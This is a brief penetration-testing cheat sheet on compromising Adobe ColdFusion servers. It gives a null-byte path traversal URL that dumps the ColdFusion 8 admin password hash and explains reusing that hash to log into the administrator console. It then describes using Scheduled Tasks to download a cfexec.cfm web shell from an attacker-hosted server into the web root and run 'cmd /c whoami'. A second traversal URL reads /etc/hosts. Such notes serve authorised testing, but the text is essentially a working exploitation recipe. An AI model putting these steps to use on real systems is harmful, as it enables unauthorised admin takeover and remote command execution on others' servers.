#Coldfusion
Check for the existance of the admin console **/CFIDE/administrator/index.cfm**

Then check for the version.  If it's coldfusion 8 you  can get the admin hash using:
**/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en**

Replace
**hex_hmac_sha1(cfadminPassword.value)**
With the fields below where THE_HASH is the hash you received from the lfi vulnerability above.
**hex_hmac_sha1(salt.value, 'THE_HASH')**

Next find the full file path from **Settings Summary**
Then schedule a task to download a ColdFusion web shell into the web directory using the
**Scheduled Tasks** feature.
Go to **/usr/share/webshell/cfm** and host a file
In the schedule tasks set the url to the cfm url **<address>/cfexec.cfm**
Click the run button to execute the task
Then go to **<address>/cfexec.cfm**
Set the command to **cmd**
Options **/c whoami**
And timeout to a few seconds

### ColdFusion9,8 and earlier path traversal debugging
```
/CFIDE/debug/cf_debugFr.cfm?userPage=../../../etc/hosts
```
